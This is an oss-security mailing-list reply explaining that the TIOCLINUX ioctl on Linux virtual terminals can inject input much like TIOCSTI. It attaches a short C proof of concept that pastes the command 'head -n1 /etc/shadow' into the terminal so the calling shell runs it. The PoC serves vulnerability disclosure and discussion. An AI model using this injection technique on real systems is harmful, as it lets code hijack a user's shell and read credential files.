Received: (qmail 13324 invoked by uid 550); 14 Mar 2023 10:36:41 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 12264 invoked from network); 14 Mar 2023 10:36:40 -0000
Authentication-Results: garm.ovh; auth=pass (GARM-110S004892d902a-59e0-466c-9228-0b804491a3ed,
                    E3B2FEC9884B69B3440B2190AD6891803BB68852) smtp.auth=jwilk@jwilk.net
X-OVh-ClientIp: 5.172.255.239
Date: Tue, 14 Mar 2023 11:36:26 +0100
From: Jakub Wilk <jwilk@jwilk.net>
To: <oss-security@lists.openwall.com>
Message-ID: <20230314103626.3ucbt2rjdfhjbe6t@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
References: <20230314095103.1ed76cc0.hanno@hboeck.de>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b3hy2dixrihsijdl"
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20230314095103.1ed76cc0.hanno@hboeck.de>
X-Originating-IP: [37.59.142.110]
X-ClientProxiedBy: DAG8EX2.mxp6.local (172.16.2.72) To DAG4EX1.mxp6.local
 (172.16.2.31)
X-Ovh-Tracer-GUID: 3c4dfe29-fd24-4a39-823e-86f414612d3a
X-Ovh-Tracer-Id: 5633158713198958359
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgedvhedrvddviedgudejucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecuhedttdenucenucfjughrpeffhffvuffkfhggtggugfgjihesmhekreertddtjeenucfhrhhomheplfgrkhhusgcuhghilhhkuceojhifihhlkhesjhifihhlkhdrnhgvtheqnecuggftrfgrthhtvghrnhepgeduudeiteejffeitdffvdduudelffdvgefffefhtdekvdfhveefueegiefgffeknecuffhomhgrihhnpehophgvnhifrghllhdrtghomhdpghhithhhuhgsrdgtohhmnecukfhppeduvdejrddtrddtrddupdefjedrheelrddugedvrdduuddtnecuvehluhhsthgvrhfuihiivgeptdenucfrrghrrghmpehinhgvthepuddvjedrtddrtddruddpmhgrihhlfhhrohhmpeeojhifihhlkhesjhifihhlkhdrnhgvtheqpdhnsggprhgtphhtthhopedupdhrtghpthhtohepohhsshdqshgvtghurhhithihsehlihhsthhsrdhophgvnhifrghllhdrtghomhdpoffvtefjohhsthepmhhoheehvddpmhhouggvpehsmhhtphhouhht
Subject: Re: [oss-security] TTY pushback vulnerabilities / TIOCSTI

--b3hy2dixrihsijdl
Content-Type: text/plain; charset="utf-8"; format=flowed
Content-Disposition: inline
Content-Transfer-Encoding: 8bit

* Hanno Böck <hanno@hboeck.de>, 2023-03-14 09:51:
>In the 2017 post solar designer mentioned that the Linux kernel 
>developers have multiple times rejected changes in the kernel.

I believe this is the post in question:
https://www.openwall.com/lists/oss-security/2017/06/03/9

>Starting with Kernel 6.2 it is possible to disable TIOCSTI (unset 
>CONFIG_LEGACY_TIOCSTI).

Nice, but...

On Linux virtual terminals, it's possible to achieve pretty much the 
same effect using TIOCLINUX, the ioctl used by gpm to implement 
copy&pasting.

I've attached a minimal PoC. A more elaborate one is here:
https://github.com/jwilk/ttyjack

-- 
Jakub Wilk

--b3hy2dixrihsijdl
Content-Type: text/x-csrc; charset="us-ascii"
Content-Disposition: attachment; filename="minittyjack.c"

#include <stdio.h>
#include <sys/ioctl.h>

#include <linux/tiocl.h>
#include <linux/vt.h>

int main(void)
{
    printf("\33[H\33[2J");
    printf("head -n1 /etc/shadow\n");
    fflush(stdout);
    struct {
        char padding;
        char subcode;
        struct tiocl_selection sel;
    } data = {
        .subcode = TIOCL_SETSEL,
        .sel = {
            .xs = 1, .ys = 1,
            .xe = 1, .ye = 1,
            .sel_mode = TIOCL_SELLINE
        }
    };
    ioctl(0, TIOCLINUX, &data.subcode);
    data.subcode = TIOCL_PASTESEL;
    ioctl(0, TIOCLINUX, &data.subcode);
}

--b3hy2dixrihsijdl--
